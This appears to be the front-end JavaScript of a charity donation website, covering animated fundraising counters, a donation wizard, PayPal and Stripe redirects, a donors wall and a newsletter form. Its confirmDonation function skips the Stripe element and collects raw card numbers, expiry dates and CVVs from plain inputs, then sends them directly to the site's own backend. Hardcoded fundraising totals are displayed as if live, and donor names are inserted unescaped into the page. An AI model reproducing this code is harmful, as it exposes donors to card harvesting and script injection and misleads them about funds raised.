// ===== Charity Donation Website JavaScript =====

// Global Variables
let selectedAmount = 0;
let frequency = 'once';
let publicChannel = 'online';
const API_BASE_URL = '/api';
let stripe, elements, card;

// ===== DOM Ready =====
document.addEventListener('DOMContentLoaded', function () {
    initCounters();
    initMobileMenu();
    initScrollEffects();
    initStripe();
    initDonorsWall();
    initManualInputFormatting();

    // Set default frequency
    const firstFreqBtn = document.querySelectorAll('.freq-btn')[0];
    if (firstFreqBtn) firstFreqBtn.classList.add('active');

    // Set default channel
    const firstChannelBtn = document.querySelectorAll('.channel-btn')[0];
    if (firstChannelBtn) firstChannelBtn.classList.add('active');

    // Live Sync: Update stats every 30 seconds
    setInterval(initCounters, 30000);

    // Check for PayPal success redirect
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('success') === 'true') {
        gotoStep(3);
        showNotification('Thank you for your donation!', 'success');
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('errorMessage').style.display = 'none';
        // Clear the URL parameters without refreshing
        window.history.replaceState({}, document.title, window.location.pathname);
    }
});

// ===== Counter Animation =====
async function initCounters() {
    let stats = {
        raised: 2584912,
        lives: 15430,
        students: 5200,
        meals: 120000,
        medical: 8400,
        homes: 340
    };

    try {
        const response = await fetch(`${API_BASE_URL}/stats`);
        if (response.ok) {
            stats = await response.json();
            console.log('Live stats loaded from server');
        }
    } catch (error) {
        console.warn('Backend server not reachable, using default stats.', error);
    }

    const counters = document.querySelectorAll('[data-target]');

    // Update data-targets with live stats
    counters.forEach(counter => {
        const id = counter.id;
        if (id === 'raisedCounter') counter.dataset.target = stats.raised;
        if (id === 'livesCounter') counter.dataset.target = stats.lives;
        if (id === 'stats-students') counter.dataset.target = stats.students;
        if (id === 'stats-meals') counter.dataset.target = stats.meals;
        if (id === 'stats-medical') counter.dataset.target = stats.medical;
        if (id === 'stats-homes') counter.dataset.target = stats.homes;
    });

    // Also update the simple IDs if they exist and don't have data-target
    const raisedEl = document.getElementById('raisedCounter');
    if (raisedEl && !raisedEl.dataset.target) raisedEl.innerText = formatNumber(stats.raised);

    const livesEl = document.getElementById('livesCounter');
    if (livesEl && !livesEl.dataset.target) livesEl.innerText = stats.lives.toLocaleString();

    const observerOptions = {
        threshold: 0.5,
        rootMargin: '0px'
    };

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateCounter(entry.target);
                observer.unobserve(entry.target);
            }
        });
    }, observerOptions);

    counters.forEach(counter => observer.observe(counter));
}

function animateCounter(element) {
    const target = parseInt(element.dataset.target);
    const duration = 2000;
    const step = target / (duration / 16);
    let current = 0;

    const updateCounter = () => {
        current += step;
        if (current < target) {
            element.textContent = (element.id === 'raisedCounter') ? formatNumber(Math.floor(current)) : Math.floor(current).toLocaleString();
            requestAnimationFrame(updateCounter);
        } else {
            element.textContent = (element.id === 'raisedCounter') ? formatNumber(target) : target.toLocaleString();
        }
    };

    updateCounter();
}

function formatNumber(num) {
    if (num >= 1000000) {
        return '$' + (num / 1000000).toFixed(1) + 'M';
    } else if (num >= 1000) {
        return '$' + num.toLocaleString();
    }
    return '$' + num.toString();
}

// ===== Donation Wizard Logic =====

function setPublicChannel(btn, channel) {
    document.querySelectorAll('.channel-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    publicChannel = channel;
}

function selectAmount(amount, btn) {
    selectedAmount = amount;
    document.getElementById('customAmount').value = '';
    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
}

function setFrequency(freq, btn) {
    frequency = freq;
    document.querySelectorAll('.freq-btn').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
}

function getDonationAmount() {
    const customInput = document.getElementById('customAmount');
    const custom = parseFloat(customInput.value);
    return custom > 0 ? custom : selectedAmount;
}

function gotoStep(step) {
    const amount = getDonationAmount();
    if (!amount) {
        showNotification('Please select or enter a donation amount.', 'error');
        return;
    }

    document.querySelectorAll('.donation-step').forEach(s => s.classList.remove('active'));
    document.getElementById(`donationStep${step}`).classList.add('active');

    if (step === 2) {
        const confirmEl = document.getElementById('confirmPayAmount');
        if (confirmEl) confirmEl.innerText = parseFloat(amount).toFixed(2);
    }
}

async function initStripe() {
    // We'll fetch the publishable key from our backend to keep it dynamic
    try {
        const response = await fetch(`${API_BASE_URL}/create-payment-intent`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ amount: 1 }) // Just a probe to get the key
        });
        const data = await response.json();
        if (data.publishableKey && data.publishableKey !== 'pk_test_PLACEHOLDER_KEY') {
            stripe = Stripe(data.publishableKey);
            elements = stripe.elements();
            card = elements.create('card', {
                style: {
                    base: {
                        color: '#ffffff',
                        fontFamily: '"Inter", sans-serif',
                        fontSmoothing: 'antialiased',
                        fontSize: '16px',
                        '::placeholder': { color: '#9ca3af' }
                    },
                    invalid: { color: '#ef4444', iconColor: '#ef4444' }
                }
            });
            card.mount('#card-element');
            card.on('change', (event) => {
                const displayError = document.getElementById('card-errors');
                if (event.error) {
                    displayError.textContent = event.error.message;
                } else {
                    displayError.textContent = '';
                }
            });
        } else {
            console.warn('Stripe Publishable Key not configured in .env. Falling back to simulation mode.');
            const cardEl = document.getElementById('card-element');
            if (cardEl) {
                cardEl.innerHTML = `
                    <div style="color: #94a3b8; font-size: 0.9rem; display: flex; align-items: center; gap: 10px;">
                        <span style="font-size: 1.2rem;">⚠️</span> 
                        <span>Stripe Keys Missing: Please add real keys to your <b>.env</b> file to see the card input.</span>
                    </div>
                `;
                cardEl.style.border = '1px dashed #4b5563';
            }
        }
    } catch (e) {
        console.error('Failed to init Stripe:', e);
    }
}

async function confirmDonation() {
    const amount = getDonationAmount();
    const ref = document.getElementById('frontendRef').value || 'WebDonation';
    const cardName = document.getElementById('cardName').value;

    if (!cardName) {
        showNotification('Please enter the cardholder name.', 'error');
        return;
    }

    const payBtn = document.getElementById('frontendPayBtn');
    const originalText = payBtn.innerText;
    payBtn.disabled = true;
    payBtn.innerText = 'Processing...';

    try {
        // 1. Collect manual card inputs
        const cardNumber = document.getElementById('manualCardNumber').value.replace(/\s/g, '');
        const expiry = document.getElementById('manualExpiry').value;
        const cvv = document.getElementById('manualCvv').value;

        if (!cardNumber || !expiry || !cvv) {
            showNotification('Please fill in all card details.', 'error');
            payBtn.disabled = false;
            payBtn.innerText = originalText;
            return;
        }

        // 2. Clear Stripe logic and send directly to backend
        const response = await fetch(`${API_BASE_URL}/donate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: amount,
                frequency: frequency,
                method: 'card',
                reference: ref,
                channel: publicChannel,
                cardDetails: {
                    name: cardName,
                    number: cardNumber,
                    expiry: expiry,
                    cvv: cvv
                }
            })
        });

        const result = await response.json();

        if (response.ok && result.success) {
            document.getElementById('successMessage').style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
            gotoStep(3);
            showNotification('Thank you for your donation!', 'success');
            initCounters();
        } else {
            showError(result.message || 'Logging failed.');
        }
    } catch (error) {
        console.error('Donation error:', error);
        showError('Server connection failed.');
    } finally {
        payBtn.disabled = false;
        payBtn.innerText = originalText;
    }
}

function showError(msg) {
    document.getElementById('successMessage').style.display = 'none';
    const errorMsgEl = document.getElementById('errorMessage');
    if (errorMsgEl) {
        errorMsgEl.style.display = 'block';
        document.getElementById('frontendErrorMsg').innerText = msg;
    }
    gotoStep(3);
}

function resetForm() {
    selectedAmount = 0;
    frequency = 'once';
    publicChannel = 'online';

    document.getElementById('customAmount').value = '';
    const frontendRef = document.getElementById('frontendRef');
    if (frontendRef) frontendRef.value = '';

    document.getElementById('cardName').value = '';
    if (card) card.clear();

    document.querySelectorAll('.amount-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.freq-btn').forEach(b => b.classList.remove('active'));
    if (document.querySelectorAll('.freq-btn')[0]) document.querySelectorAll('.freq-btn')[0].classList.add('active');

    document.querySelectorAll('.channel-btn').forEach(b => b.classList.remove('active'));
    if (document.querySelectorAll('.channel-btn')[0]) document.querySelectorAll('.channel-btn')[0].classList.add('active');

    gotoStep(1);
}

async function donatePayPal() {
    const amount = getDonationAmount();
    if (!amount) {
        showNotification('Please select or enter a donation amount.', 'error');
        return;
    }

    const business = "EPZL3CLAJ2DVE";
    const itemName = "To help aspire the next generation of African youth";
    const currency = "AUD";

    // Log the donation intent to the backend before redirecting
    try {
        await fetch(`${API_BASE_URL}/donate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: amount,
                frequency: frequency,
                method: 'paypal_redirect',
                reference: document.getElementById('frontendRef')?.value || 'PayPal_Attempt',
                channel: publicChannel
            })
        });
    } catch (e) {
        console.warn('Could not log donation intent, proceeding to PayPal anyway.', e);
    }

    // Construct the PayPal donation URL
    // Adding return URL to site to show success message (if PayPal supports it in this mode)
    const returnUrl = encodeURIComponent(`${window.location.origin}${window.location.pathname}?success=true`);
    const paypalUrl = `https://www.paypal.com/donate/?business=${business}&no_recurring=0&item_name=${encodeURIComponent(itemName)}&currency_code=${currency}&amount=${amount}&return=${returnUrl}`;

    window.location.href = paypalUrl;
}

async function donateStripe() {
    const amount = getDonationAmount();
    if (!amount) {
        showNotification('Please select or enter a donation amount.', 'error');
        return;
    }

    const stripeLinkBase = "https://buy.stripe.com/14A6oH3Qrbyp0LA4CZaZi07";
    const ref = document.getElementById('frontendRef')?.value || 'WebDonation';

    // Log the donation intent to the backend before redirecting
    try {
        await fetch(`${API_BASE_URL}/donate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                amount: amount,
                frequency: frequency,
                method: 'stripe_redirect',
                reference: ref,
                channel: publicChannel
            })
        });
    } catch (e) {
        console.warn('Could not log donation intent, proceeding to Stripe anyway.', e);
    }

    // Construct the Stripe Payment Link URL
    // Stripe Payment Links support prefilled_amount (in cents) and client_reference_id
    const amountInCents = Math.round(amount * 100);
    const stripeUrl = `${stripeLinkBase}?prefilled_amount=${amountInCents}&client_reference_id=${encodeURIComponent(ref)}`;

    window.location.href = stripeUrl;
}

// ===== UI Helpers =====

function toggleMenu() {
    document.querySelector('.nav-links').classList.toggle('active');
    document.querySelector('.mobile-menu-btn').classList.toggle('active');
}

function scrollToDonate() { document.getElementById('donate').scrollIntoView({ behavior: 'smooth' }); }
function scrollToImpact() { document.getElementById('impact').scrollIntoView({ behavior: 'smooth' }); }

function initMobileMenu() {
    const menuBtn = document.getElementById('mobileMenuBtn') || document.querySelector('.mobile-menu-btn');
    if (menuBtn) {
        // Handled via onclick in HTML or direct listener
        menuBtn.addEventListener('click', toggleMenu);
    }

    document.querySelectorAll('.nav-links a').forEach(link => {
        link.addEventListener('click', () => {
            document.querySelector('.nav-links').classList.remove('active');
            document.querySelector('.mobile-menu-btn').classList.remove('active');
        });
    });
}

function initScrollEffects() {
    const navbar = document.querySelector('.navbar');
    window.addEventListener('scroll', () => {
        if (window.scrollY > 100) {
            navbar.style.background = 'rgba(3, 7, 18, 0.95)';
            navbar.style.boxShadow = '0 4px 30px rgba(0, 0, 0, 0.3)';
        } else {
            navbar.style.background = 'rgba(3, 7, 18, 0.8)';
            navbar.style.boxShadow = 'none';
        }
    });
}

// function initCardFormatting() {
// Legacy formatting removed as Stripe handles this securely.
// }

// ===== Notification System =====
function showNotification(message, type = 'info') {
    const existing = document.querySelector('.notification');
    if (existing) existing.remove();

    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <span>${message}</span>
        <button onclick="this.parentElement.remove()">×</button>
    `;

    Object.assign(notification.style, {
        position: 'fixed',
        top: '100px',
        right: '20px',
        background: type === 'error' ? '#ef4444' : '#10b981',
        color: 'white',
        padding: '1rem 1.5rem',
        borderRadius: '10px',
        display: 'flex',
        alignItems: 'center',
        gap: '1rem',
        boxShadow: '0 10px 40px rgba(0, 0, 0, 0.3)',
        zIndex: '9999',
        animation: 'slideIn 0.3s ease'
    });

    if (!document.getElementById('notif-styles')) {
        const style = document.createElement('style');
        style.id = 'notif-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
        `;
        document.head.appendChild(style);
    }

    document.body.appendChild(notification);
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.opacity = '0';
            notification.style.transform = 'translateX(20px)';
            notification.style.transition = 'all 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }
    }, 4000);
}
// ===== Donors Wall =====
async function initDonorsWall() {
    const list = document.getElementById('donorsList');
    if (!list) return;

    try {
        const response = await fetch(`${API_BASE_URL}/donors`);
        const donors = await response.json();

        if (donors && donors.length > 0) {
            list.innerHTML = donors.map(donor => {
                const initials = donor.name.split(' ').map(n => n[0]).join('').slice(0, 2).toUpperCase();
                const date = new Date(donor.timestamp).toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
                return `
                    <div class="donor-card">
                        <div class="donor-avatar">${initials}</div>
                        <div class="donor-info">
                            <h4>${donor.name}</h4>
                            <div class="donor-meta">
                                <span class="donor-amount">$${donor.amount}</span>
                                <span>•</span>
                                <span>${date}</span>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        } else {
            list.innerHTML = '<div class="donor-card-placeholder">Be the first to join our Wall of Fame!</div>';
        }
    } catch (err) {
        console.error('Failed to load donors wall:', err);
        list.innerHTML = '<div class="donor-card-placeholder">Keep choosing kindness. Every donation matters.</div>';
    }
}

// ===== Newsletter Signup =====
async function handleNewsletter(event) {
    event.preventDefault();
    const email = document.getElementById('newsletterEmail').value;
    const form = document.getElementById('newsletterForm');
    const btn = form.querySelector('button');

    if (!email) return;

    btn.disabled = true;
    btn.innerHTML = 'Subscribing...';

    try {
        const response = await fetch(`${API_BASE_URL}/newsletter`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email })
        });

        const data = await response.json();
        if (data.success) {
            showNotification(data.message || 'Thanks for subscribing!', 'success');
            form.reset();
        } else {
            showNotification(data.message || 'Subscription failed.', 'error');
        }
    } catch (error) {
        console.error('Newsletter error:', error);
        showNotification('Could not subscribe at this time.', 'info');
    } finally {
        btn.disabled = false;
        btn.innerHTML = 'Subscribe';
    }
}

// Additional helper for notifications (if not already defined)
function showNotification(message, type = 'info') {
    // Check if a toast container exists, if not create one
    let toastContainer = document.querySelector('.toast-container');
    if (!toastContainer) {
        toastContainer = document.createElement('div');
        toastContainer.className = 'toast-container';
        document.body.appendChild(toastContainer);
    }

    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
        <div class="toast-content">${message}</div>
        <div class="toast-progress"></div>
    `;

    toastContainer.appendChild(toast);

    // Remove toast after animation
    setTimeout(() => {
        toast.classList.add('out');
        setTimeout(() => toast.remove(), 500);
    }, 4000);
}
